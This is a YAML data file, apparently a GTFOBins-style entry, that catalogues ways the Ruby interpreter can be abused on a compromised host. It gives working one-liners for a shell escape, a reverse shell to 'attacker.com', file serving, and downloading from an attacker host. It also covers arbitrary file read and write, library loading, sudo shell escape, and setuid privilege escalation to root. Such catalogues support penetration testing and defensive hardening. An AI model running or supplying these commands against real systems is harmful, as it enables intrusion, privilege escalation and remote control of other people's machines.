---
functions:
  shell:
    - code: ruby -e 'exec "/bin/sh"'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  file-upload:
    - description: Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.
      code: |
        export LPORT=8888
        ruby -run -e httpd . -p $LPORT
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        ruby -e 'require "open-uri"; download = open(ENV["URL"]); IO.copy_stream(download, ENV["LFILE"])'
  file-write:
    - code: ruby -e 'File.open("file_to_write", "w+") { |f| f.write("DATA") }'
  file-read:
    - code: ruby -e 'puts File.read("file_to_read")'
  library-load:
    - code: ruby -e 'require "fiddle"; Fiddle.dlopen("lib.so")'
  sudo:
    - code: sudo ruby -e 'exec "/bin/sh"'
  capabilities:
    - code: ./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
---
